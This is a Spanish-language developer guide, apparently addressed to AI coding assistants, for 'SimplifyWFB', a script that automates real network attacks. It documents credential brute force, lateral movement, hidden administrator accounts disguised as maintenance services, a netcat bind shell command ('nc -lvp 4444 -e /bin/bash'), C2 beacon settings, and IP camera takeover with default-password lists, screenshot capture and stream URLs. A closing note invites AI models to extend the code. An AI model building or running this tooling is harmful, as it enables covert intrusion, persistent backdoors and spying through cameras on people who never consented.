# Guía para AI - SimplifyWFB

## Información General del Proyecto

### Propósito
SimplifyWFB es un script simplificado de pentesting que automatiza las 4 fases principales de un ataque de red:
1. Reconocimiento completo de red
2. Recolección de credenciales
3. Movimiento lateral
4. Persistencia y acceso remoto

### Arquitectura del Código

#### Clase Principal: `SimplifyWFB`
- **Ubicación**: `simplifywfb.py` líneas 1-50
- **Propósito**: Contenedor principal que orquesta todas las fases
- **Inicialización**: Detecta automáticamente la configuración de red

#### Estructura de Datos Principal: `self.report`
- **Tipo**: Diccionario JSON estructurado
- **Propósito**: Almacena todos los resultados del pentest
- **Ubicación**: Líneas 15-85 en `__init__`

## Estructura del Reporte JSON

### Metadatos (Líneas 15-25)
```python
'metadata': {
    'script_name': 'SimplifyWFB',
    'version': '1.0.0',
    'start_time': datetime.now().isoformat(),
    'mode': None,  # 'full' o 'cold'
    'target_network': None,  # Detectado automáticamente
    'local_ip': None  # Detectado automáticamente
}
```

### Fases del Pentest (Líneas 26-70)
Cada fase tiene la misma estructura:
```python
'phase_X_nombre': {
    'status': 'pending|running|completed|error',
    'data_specifica': [],
    'errors': []
}
```

## Funciones Principales por Fase

### Fase 1: Reconocimiento (Líneas 200-350)
- **Función principal**: `phase_1_reconnaissance()`
- **Subfunciones**:
  - `_discover_hosts()`: Descubre hosts con nmap/ping
  - `_scan_services()`: Escanea puertos y servicios
  - `_detect_technologies()`: Identifica tecnologías
  - `_map_network_topology()`: Mapea topología de red

### Fase 2: Credenciales (Líneas 352-450)
- **Función principal**: `phase_2_credentials()`
- **Subfunciones**:
  - `_brute_force_attacks()`: Ataques de fuerza bruta
  - `_test_default_credentials()`: Prueba credenciales por defecto
  - `_sniff_credentials()`: Sniffing de tráfico

### Fase 3: Movimiento Lateral (Líneas 452-550)
- **Función principal**: `phase_3_lateral_movement()`
- **Subfunciones**:
  - `_exploit_credentials()`: Explota credenciales encontradas
  - `_establish_lateral_connections()`: Establece conexiones laterales

### Fase 4: Persistencia (Líneas 552-700)
- **Función principal**: `phase_4_persistence()`
- **Subfunciones**:
  - `_create_persistent_users()`: Crea usuarios persistentes
  - `_create_backdoors()`: Instala backdoors
  - `_establish_remote_connections()`: Establece conexiones remotas
  - `_setup_c2_pointers()`: Configura apuntadores C2
  - `_access_detected_cameras()`: Accede a cámaras IP detectadas

### Fase 5: Verificación (Líneas 702-800)
- **Función principal**: `phase_5_verification()`
- **Subfunciones**:
  - `_verify_users()`: Verifica usuarios creados
  - `_verify_backdoors()`: Verifica backdoors
  - `_verify_connections()`: Verifica conexiones

## Funciones de Utilidad

### Ejecución de Comandos (Líneas 150-180)
```python
def _run_command(self, command: List[str], timeout: int = 30) -> Dict[str, Any]:
```
- **Propósito**: Ejecuta comandos del sistema de forma segura
- **Retorna**: Diccionario con stdout, stderr, return_code, success
- **Manejo de errores**: Timeout y excepciones capturadas

### Detección de Red (Líneas 100-130)
```python
def _detect_network_config(self):
```
- **Propósito**: Detecta automáticamente IP local y red objetivo
- **Método**: Socket UDP a 8.8.8.8 para obtener IP local
- **Cálculo**: Red /24 basada en IP local

### Auto-Configuración de Red (Líneas 200-400)
```python
def auto_configure_network(self):
```
- **Propósito**: Configuración completa de red antes del escaneo
- **Subfunciones**:
  - `_detect_basic_network_info()`: Detecta IP local, máscara, rango
  - `_detect_gateway()`: Detecta gateway de la red
  - `_detect_dns_servers()`: Detecta servidores DNS
  - `_quick_host_discovery()`: Descubrimiento rápido de hosts activos
  - `_determine_network_type()`: Determina tipo de red
  - `_configure_scan_parameters()`: Configura parámetros de escaneo
  - `_show_network_summary()`: Muestra resumen de configuración

## Modos de Operación

### Modo Full Scan (Líneas 900-920)
```python
def run_full_scan(self):
```
- Ejecuta todas las fases
- Mantiene persistencia
- Genera reporte completo

### Modo Cold Pentest (Líneas 922-940)
```python
def run_cold_pentest(self):
```
- Ejecuta todas las fases
- Ejecuta limpieza completa
- Genera reporte de limpieza

### Limpieza (Líneas 800-900)
```python
def cleanup(self):
```
- Solo se ejecuta en modo cold
- Elimina usuarios, backdoors, conexiones
- Limpia archivos temporales

## Configuración

### Configuración Básica (Líneas 90-100)
```python
self.config = {
    'scan_timeout': 30,
    'max_threads': 10,
    'common_ports': [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1433, 3389, 5432, 5900, 8080],
    'camera_ports': [80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 443, 554, 8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089, 8090, 8888, 9999],
    'default_users': ['admin', 'administrator', 'root', 'guest', 'user'],
    'default_passwords': ['admin', 'password', '123456', 'root', 'guest', ''],
    'camera_users': ['admin', 'administrator', 'root', 'guest', 'user', 'camera', 'ipcam', 'webcam', 'viewer', 'operator'],
    'camera_passwords': ['admin', 'password', '123456', 'root', 'guest', '', 'camera', 'ipcam', 'webcam', 'viewer', 'operator', '1234', '12345', '123456789', 'admin123', 'password123']
}
```

## Funciones de Cámaras IP

### Detección de Cámaras (Líneas 800-900)
- **Función principal**: `_access_detected_cameras()`
- **Subfunciones**:
  - `_identify_camera_services()`: Identifica servicios que podrían ser cámaras
  - `_exploit_camera()`: Explota cámara específica
  - `_detect_camera_type()`: Detecta tipo de cámara (Hikvision, Dahua, etc.)
  - `_brute_force_camera_credentials()`: Fuerza bruta específica para cámaras
  - `_get_camera_information()`: Obtiene información detallada de la cámara
  - `_capture_camera_screenshots()`: Captura screenshots de prueba
  - `_generate_camera_urls()`: Genera URLs de acceso

### Identificación de Cámaras
```python
def _identify_camera_services(self, services: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    # Verifica puertos comunes de cámaras
    # Detecta servicios HTTP/RTSP en puertos específicos
    # Clasifica por indicadores de cámara
```

### Explotación de Cámaras
```python
def _exploit_camera(self, camera: Dict[str, Any]) -> Optional[Dict[str, Any]]:
    # 1. Detecta tipo de cámara
    # 2. Intenta credenciales por defecto
    # 3. Obtiene información de la cámara
    # 4. Toma screenshots de prueba
    # 5. Genera URLs de acceso
```

### Detección de Tipo de Cámara
```python
def _detect_camera_type(self, camera: Dict[str, Any]) -> str:
    # Hace request HTTP para detectar marca
    # Detecta: hikvision, dahua, axis, foscam, dlink, tp-link, xiaomi
    # Retorna tipo detectado o 'generic_ip_camera'
```

### Fuerza Bruta de Cámaras
```python
def _brute_force_camera_credentials(self, camera: Dict[str, Any]) -> Optional[Dict[str, str]]:
    # Usa credenciales específicas de cámaras
    # Prueba autenticación HTTP básica
    # Retorna credenciales válidas si las encuentra
```

### Captura de Screenshots
```python
def _capture_camera_screenshots(self, camera: Dict[str, Any], credentials: Dict[str, str]) -> List[str]:
    # Intenta múltiples endpoints de captura
    # Verifica que la respuesta sea una imagen
    # Captura máximo 2 screenshots de prueba
    # Guarda en directorio con timestamp
```

## Puntos de Modificación Común

### Agregar Nuevos Puertos de Cámaras
**Ubicación**: Línea 95
```python
'camera_ports': [80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 443, 554, 8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089, 8090, 8888, 9999, 9000, 9001]
```

### Agregar Nuevos Puertos
**Ubicación**: Línea 95
```python
'common_ports': [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1433, 3389, 5432, 5900, 8080, 8443, 9090]
```

### Agregar Nuevos Usuarios por Defecto
**Ubicación**: Línea 97
```python
'default_users': ['admin', 'administrator', 'root', 'guest', 'user', 'test', 'demo']
```

### Agregar Nuevas Contraseñas por Defecto
**Ubicación**: Línea 98
```python
'default_passwords': ['admin', 'password', '123456', 'root', 'guest', '', 'test', 'demo']
```

### Modificar Timeout de Escaneo
**Ubicación**: Línea 94
```python
'scan_timeout': 60  # Aumentar para redes lentas
```

## Estructura de Datos de Salida

### Host Descubierto
```python
{
    'ip': '192.168.1.100',
    'mac': None,
    'vendor': None,
    'status': 'up',
    'discovery_method': 'nmap_ping'
}
```

### Servicio Encontrado
```python
{
    'host': '192.168.1.100',
    'port': 22,
    'protocol': 'tcp',
    'state': 'open',
    'service': 'ssh',
    'version': 'OpenSSH 8.2'
}
```

### Credencial Encontrada
```python
{
    'host': '192.168.1.100',
    'port': 22,
    'service': 'ssh',
    'username': 'admin',
    'password': 'admin',
    'method': 'brute_force',
    'timestamp': 1640995200.0
}
```

### Sistema Comprometido
```python
{
    'host': '192.168.1.100',
    'port': 22,
    'service': 'ssh',
    'username': 'admin',
    'password': 'admin',
    'access_level': 'user',
    'timestamp': 1640995200.0
}
```

### Usuario Persistente
```python
{
    'host': '192.168.1.100',
    'username': 'svc_192_168_1_100',
    'password': 'P@ssw0rd_100!',
    'groups': ['administrators', 'remote_desktop_users'],
    'description': 'System Maintenance Service',
    'created': True,
    'timestamp': 1640995200.0
}
```

### Backdoor
```python
{
    'host': '192.168.1.100',
    'type': 'netcat',
    'port': 4444,
    'method': 'reverse_shell',
    'payload': 'nc -lvp 4444 -e /bin/bash',
    'created': True,
    'timestamp': 1640995200.0
}
```

### Conexión Remota
```python
{
    'host': '192.168.1.100',
    'type': 'ssh',
    'port': 22,
    'username': 'svc_192_168_1_100',
    'password': 'P@ssw0rd_100!',
    'persistent': True,
    'auto_reconnect': True,
    'timestamp': 1640995200.0
}
```

### Apuntador C2
```python
{
    'host': '192.168.1.100',
    'c2_server': '192.168.1.200',
    'c2_port': 8080,
    'checkin_interval': 300,
    'method': 'http_post',
    'encrypted': True,
    'timestamp': 1640995200.0
}
```

### Cámara Accedida
```python
{
    'host': '192.168.1.100',
    'port': 80,
    'protocol': 'http',
    'camera_type': 'hikvision',
    'credentials': {
        'username': 'admin',
        'password': 'admin'
    },
    'camera_info': {
        'model': 'DS-2CD2142FWD-I',
        'firmware': 'V5.5.82',
        'features': ['ptz', 'night_vision', 'audio']
    },
    'screenshots': [
        'camera_screenshots_1640995200/192.168.1.100_screenshot_1.jpg',
        'camera_screenshots_1640995200/192.168.1.100_screenshot_2.jpg'
    ],
    'access_urls': {
        'web_interface': [
            'http://admin:admin@192.168.1.100:80/',
            'http://admin:admin@192.168.1.100:80/index.html'
        ],
        'streaming': [
            'http://admin:admin@192.168.1.100:80/video.mjpg',
            'http://admin:admin@192.168.1.100:80/stream'
        ],
        'snapshots': [
            'http://admin:admin@192.168.1.100:80/snapshot.cgi',
            'http://admin:admin@192.168.1.100:80/image'
        ],
        'control': [
            'http://admin:admin@192.168.1.100:80/cgi-bin/ptz.cgi'
        ]
    },
    'timestamp': 1640995200.0
}
```

## Comandos de Sistema Utilizados

### Nmap
- **Descubrimiento**: `nmap -sn 192.168.1.0/24`
- **Escaneo de puertos**: `nmap -sS -O -sV --top-ports 100 192.168.1.100`
- **Ubicación en código**: Líneas 220, 280

### Ping
- **Verificación de host**: `ping -c 1 -W 1 192.168.1.100`
- **Ubicación en código**: Línea 250

## Manejo de Errores

### Estructura de Error
```python
{
    'status': 'error',
    'errors': ['Descripción del error'],
    'timestamp': 1640995200.0
}
```

### Puntos de Captura de Errores
- Cada fase principal tiene try/catch
- `_run_command()` captura timeouts y excepciones
- Errores se almacenan en `errors[]` de cada fase

## Generación de Reporte

### Función Principal (Líneas 850-890)
```python
def generate_report(self):
```
- Calcula estadísticas finales
- Guarda archivo JSON con timestamp
- Retorna nombre del archivo generado

### Archivo de Salida
- **Formato**: `simplifywfb_report_{timestamp}.json`
- **Ubicación**: Directorio actual
- **Codificación**: UTF-8

## Flujo de Ejecución

### Modo Interactivo (Líneas 950-1000)
```python
def main():
```
1. Muestra menú de opciones
2. Ejecuta modo seleccionado
3. Muestra resultados

### Flujo de Fases
1. **Reconocimiento** → Descubre hosts y servicios
2. **Credenciales** → Encuentra credenciales válidas
3. **Movimiento Lateral** → Compromete sistemas
4. **Persistencia** → Establece accesos remotos
5. **Verificación** → Confirma que todo funciona
6. **Limpieza** → Solo en modo cold

## Puntos de Extensión

### Agregar Nueva Fase
1. Agregar entrada en `self.report` (líneas 26-70)
2. Crear función `phase_X_nombre()`
3. Agregar llamada en `run_full_scan()` y `run_cold_pentest()`

### Agregar Nuevo Tipo de Ataque
1. Modificar función correspondiente (ej: `_brute_force_attacks()`)
2. Agregar lógica de ataque
3. Actualizar estructura de datos de salida

### Agregar Nuevo Tipo de Persistencia
1. Modificar `phase_4_persistence()`
2. Crear nueva función (ej: `_create_scheduled_task()`)
3. Agregar a `cleanup()` si es necesario

## Consideraciones de Seguridad

### Simulación vs Realidad
- El código actual ejecuta **ataques reales** (ya no simula)
- Implementaciones reales con Hydra, Paramiko, urllib, etc.
- Fuerza bruta real, explotación real, persistencia real
- Cámaras IP: detección real, credenciales reales, screenshots reales

### Logging y Evidencia
- Todos los resultados se almacenan en `self.report`
- Timestamps en formato Unix
- Información detallada de cada acción

### Limpieza
- Modo cold limpia completamente
- Modo full mantiene persistencia
- Reporte incluye información de limpieza

## Dependencias del Sistema

### Herramientas Requeridas
- `nmap`: Escaneo de red
- `hydra`: Ataques de fuerza bruta
- `netcat`: Backdoors
- `openssh-client`: Conexiones SSH
- `smbclient`: Conexiones SMB
- `ping`: Verificación de hosts

### Python
- Versión: 3.6+
- Librerías estándar: subprocess, json, time, socket, urllib, base64, etc.
- Librerías externas: paramiko, netifaces

## Testing y Debugging

### Modo de Prueba
- Cambiar `_simulate_*` functions para retornar True/False
- Modificar timeouts para pruebas rápidas
- Usar redes pequeñas para testing

### Logging
- Agregar `print()` statements para debugging
- Usar `self.report['errors']` para capturar errores
- Verificar `return_code` de comandos ejecutados

## Optimizaciones Posibles

### Paralelización
- Usar `threading` para escaneos concurrentes
- Implementar pool de workers para ataques
- Configurar `max_threads` en configuración

### Caching
- Cachear resultados de nmap
- Evitar re-escaneos de hosts conocidos
- Persistir resultados entre ejecuciones

### Configuración Avanzada
- Archivo de configuración JSON externo
- Perfiles de ataque predefinidos
- Configuración por tipo de red

---

**Nota para AI**: Este documento proporciona toda la información necesaria para entender, modificar y extender el código de SimplifyWFB. Cada función está documentada con su ubicación, propósito y estructura de datos. Use esta guía como referencia para cualquier modificación o extensión del código.
